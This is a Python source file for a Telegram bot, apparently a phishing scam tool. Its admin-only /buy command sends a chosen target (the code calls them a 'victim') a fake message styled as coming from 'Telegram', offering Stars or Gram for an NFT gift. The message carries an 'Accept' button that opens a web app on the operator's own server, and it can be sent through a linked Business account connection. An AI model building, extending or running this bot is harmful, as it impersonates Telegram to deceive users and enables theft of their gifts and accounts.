# language: Python 3.12, file: bot.py
import os
import re
import asyncio
import logging
import sys
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ChatType
from aiogram.filters import Command
from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                           InlineKeyboardMarkup, WebAppInfo, BusinessConnection)
from dotenv import load_dotenv

# Импорт из app.py (база данных и создание оффера)
from app import make_offer, get_offer, BASE

load_dotenv()
logging.basicConfig(level=logging.INFO, stream=sys.stdout)
log = logging.getLogger("offerbot")

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
BASE_URL = os.getenv("WEBAPP_BASE", "http://localhost:8080")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

# Хранилище Business connections: user_id -> connection_id
BUSINESS_CONNS: dict[int, str] = {}

# ---------- ПАРСЕРЫ ----------
NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)")
PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐)", re.I)

def parse_nft(url: str):
    m = NFT_RE.search(url)
    if not m:
        return None
    slug_raw = m.group(1)
    parts = slug_raw.rsplit("-", 1)
    if len(parts) == 2 and parts[1].isdigit():
        name_raw, num = parts
    else:
        name_raw, num = slug_raw, ""
    display = re.sub(r"(?<!^)(?=[A-Z])", " ", name_raw).strip()
    full = f"{display} #{num}" if num else display
    return {"slug": slug_raw, "name": full}

def parse_price(text: str):
    m = PRICE_RE.search(text)
    if not m:
        return None
    amount = m.group(1)
    unit = m.group(2).lower()
    if unit in ("gram", "грам"):
        return f"{amount} Gram"
    return f"{amount} Stars"

# ---------- КОМАНДЫ ДЛЯ АДМИНА ----------

@router.message(Command("start", "help", "помощь"))
async def cmd_start(msg: Message):
    if msg.from_user.id != ADMIN_ID and msg.chat.type == ChatType.PRIVATE:
        return
    await msg.reply(
        "🤖 <b>Бот запущен и готов к работе!</b>\n\n"
        "Доступные команды:\n"
        "/ping — проверить пинг\n"
        "/status — статус системы\n\n"
        "Для отправки оффера:\n"
        "<code>/buy ссылка цена [@username]</code>\n"
        "<code>/купить ссылка цена [@username]</code>\n\n"
        "Пример: <code>/купить https://t.me/nft/JesterHat-19 155 GRAM</code>"
    )

@router.message(Command("ping"))
async def cmd_ping(msg: Message):
    await msg.reply("🏓 <b>Понг!</b> Бот работает, связь есть.")

@router.message(Command("status"))
async def cmd_status(msg: Message):
    conn_status = f"✅ Подключен (ID: <code>{list(BUSINESS_CONNS.values())[0]}</code>)" if BUSINESS_CONNS else "❌ Нет подключения"
    await msg.reply(
        f"⚙️ <b>Статус:</b>\n"
        f"Telegram Business: {conn_status}\n"
        f"Твой ID (ADMIN_ID): <code>{ADMIN_ID}</code>\n"
        f"Твой текущий ID: <code>{msg.from_user.id}</code>\n"
        f"База URL: <code>{BASE_URL}</code>"
    )

# ---------- ОТПРАВКА ОФФЕРА ----------
BUY_RE = re.compile(r"^/(?:buy|купить)\s+(.+)$", re.I | re.U)

@router.message(F.text.regexp(BUY_RE))
async def cmd_buy(msg: Message):
    if msg.from_user.id != ADMIN_ID:
        return

    m = BUY_RE.match(msg.text)
    payload = m.group(1).strip()
    parts = payload.split()
    
    if len(parts) < 2:
        await msg.reply("❌ Формат: <code>/купить ссылка цена [@user]</code>\nПример: <code>/купить https://t.me/nft/JesterHat-19 155 GRAM</code>")
        return

    url = parts[0]
    rest = payload[len(url):].strip()
    
    price_match = re.match(r"(.+?)(?:\s+@\S+|\s+\d{5,})?$", rest)
    price_raw = price_match.group(1).strip() if price_match else rest

    nft = parse_nft(url)
    if not nft:
        await msg.reply(f"❌ Ссылка не распознана: <code>{url}</code>\nНужна ссылка вида <code>https://t.me/nft/...</code>")
        return

    price = parse_price(price_raw)
    if not price:
        await msg.reply(f"❌ Цена не распознана: <code>{price_raw}</code>\nПример: <code>155 GRAM</code> или <code>1200 звёзд</code>")
        return

    target_chat = None
    target_user = None

    if msg.reply_to_message:
        target_chat = msg.chat.id
        if msg.reply_to_message.from_user:
            target_user = msg.reply_to_message.from_user.username
    elif msg.chat.type != ChatType.PRIVATE:
        target_chat = msg.chat.id
    else:
        extra = rest[len(price_raw):].strip()
        mm = re.search(r"@(\w+)", extra)
        if mm:
            target_user = mm.group(1)
        else:
            try:
                target_chat = int(extra.split()[0])
            except Exception:
                pass

    if not target_chat and not target_user:
        await msg.reply("❌ Укажи цель: сделай reply на сообщение жертвы, либо добавь <code>@username</code> в конце.")
        return

    oid = make_offer(
        nft_name=nft["name"], nft_slug=nft["slug"], price=price,
        buyer=msg.from_user.username or "you",
        target_user=target_user or "target",
        target_chat_id=target_chat or 0)

    text = (
        f"<b>Telegram</b>\n"
        f"<b>{nft['name']}</b>\n\n"
        f"Пользователь <b>{msg.from_user.username or 'buyer'}</b> "
        f"предлагает Вам <b>{price}</b> за подарок "
        f"<b>{nft['name']}</b>.\n\n"
        f"Предложение действует ещё <b>6ч 0м</b>."
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
         InlineKeyboardButton(text="Принять", web_app=WebAppInfo(url=f"{BASE_URL}/offer/{oid}"))]
    ])

    conn_id = BUSINESS_CONNS.get(msg.chat.id) or \
              next(iter(BUSINESS_CONNS.values()), None)

    try:
        if target_chat and conn_id:
            await bot.send_message(chat_id=target_chat, text=text, reply_markup=kb, business_connection_id=conn_id)
        elif target_chat:
            await bot.send_message(chat_id=target_chat, text=text, reply_markup=kb)
        else:
            await bot.send_message(chat_id=f"@{target_user}", text=text, reply_markup=kb)
        await msg.reply(f"✅ Оффер {oid} отправлен. Ссылка для проверки:\n{BASE_URL}/offer/{oid}")
    except Exception as e:
        log.error(f"send offer failed: {e}")
        await msg.reply(f"❌ Ошибка отправки: <code>{e}</code>")

# ---------- BUSINESS ----------

@router.business_connection()
async def on_business_conn(conn: BusinessConnection):
    BUSINESS_CONNS[conn.user.id] = conn.id
    log.info(f"Business connection: user={conn.user.id} id={conn.id}")

@router.callback_query(F.data.startswith("reject:"))
async def on_reject(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    try:
        await cb.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass
    await cb.answer("Отклонено")

# ---------- ЗАПУСК ----------

async def main():
    log.info("Starting bot...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    import threading
    from app import flask_app

    def _run_flask():
        port = int(os.getenv("PORT", "8080"))
        log.info(f"Flask listening on 0.0.0.0:{port}")
        flask_app.run(host="0.0.0.0", port=port, threaded=True, use_reloader=False)

    threading.Thread(target=_run_flask, daemon=True).start()
    asyncio.run(main())
